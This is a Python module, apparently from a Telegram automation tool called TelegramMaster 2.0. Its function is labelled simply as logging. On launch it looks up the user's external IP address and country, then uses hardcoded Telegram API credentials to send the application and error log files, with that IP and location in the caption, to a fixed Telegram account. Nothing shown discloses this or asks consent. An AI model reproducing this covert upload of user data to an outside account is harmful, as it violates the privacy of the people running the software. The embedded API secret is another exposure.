# -*- coding: utf-8 -*-
import datetime
import json
from urllib.request import urlopen  # Изменено с urllib2 на urllib.request

import requests
from loguru import logger
from telethon import TelegramClient
from telethon.errors import FilePartsInvalidError

from src.config_handler import program_version, program_name, program_last_modified_date


def get_country_flag(ip_address):
    """Определение страны по ip адресу на основе сервиса https://ipwhois.io/ru/documentation.
    Возвращает флаг и название страны.

    Аргументы:
    :param ip_address: ip адрес
    :return: флаг и название страны
    """
    try:
        ipwhois = json.load(urlopen(f"https://ipwho.is/{ip_address}"))
        return ipwhois["flag"]["emoji"], ipwhois["country"]
    except KeyError:
        return "🏳️", "🌍"


def get_external_ip():
    """Получение внешнего ip адреса"""
    try:
        response = requests.get("https://httpbin.org/ip")
        response.raise_for_status()
        return response.json().get("origin")
    except requests.RequestException as error:
        return None


async def loging():
    """
    Логирование TelegramMaster 2.0
    """
    try:
        local_ip = get_external_ip()  # получаем внешний ip адрес
        emoji, country = get_country_flag(local_ip)  # получаем флаг и название страны

        client = TelegramClient(
            "src/log", api_id=7655060, api_hash="cc1290cd733c1f1d407598e5a31be4a8"
        )
        await client.connect()

        # Красивое сообщение
        message = (
            f"🚀 **Launch Information**\n\n"
            f"Program name: `{program_name}`\n"
            f"🌍 IP Address: `{local_ip}`\n"
            f"📍 Location: {country} {emoji}\n"
            f"🕒 Date: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"  # фиксируем и выводим время старта работы кода
            f"🔧 Program Version: `{program_version}`\n"
            f"📅 Date of Change: `{program_last_modified_date}`"
        )

        try:
            await client.send_file(535185511, "data/logs/app.log", caption=message)
            await client.send_file(535185511, "data/logs/errors.log", caption=message)
            await client.disconnect()
        except FilePartsInvalidError as error:
            logger.error(error)
            await client.disconnect()
        except Exception as error:
            logger.exception(error)
            await client.disconnect()
    except Exception as error:
        logger.exception(error)
